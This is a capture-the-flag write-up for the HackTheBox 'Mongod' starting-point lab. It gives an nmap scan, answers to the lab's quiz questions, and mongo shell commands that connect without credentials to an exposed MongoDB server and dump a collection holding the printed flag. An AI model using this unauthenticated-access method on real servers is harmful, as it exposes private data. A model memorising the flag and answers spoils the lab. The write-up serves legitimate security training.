---
title: 🔵 HTB / Starting Point / Mongod
date: 2023-08-01
categories: [HackTheBox, Machines]
tags: [mongodb]
---

# Mongod

_How many TCP ports are open on the machine?_

`2`

_Which service is running on port 27017 of the remote host?_

```bash
$ nmap -sV -p- <ip>
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
...

```

_What type of database is MongoDB?_

`NoSQL`

_What is the command name for the Mongo shell that is installed with the mongodb-clients package?_

`mongo`

_What is the command used for listing all the databases present on the MongoDB server?_

`show dbs`

_What is the command used for listing out the collections in a database?_

`show collections`

_What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?_

`db.flag.find().pretty()`

_Submit root flag_

```bash
# Download binaries
$ curl -O <https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz>

$ tar xvf mongodb-linux-x86_64-3.4.7.tgz

$ cd mongodb-linux-x86_64-3.4.7.tgz

$ ./bin/mongo mongodb://<ip>:27017
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> db.flag.find().pretty()
{
	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```
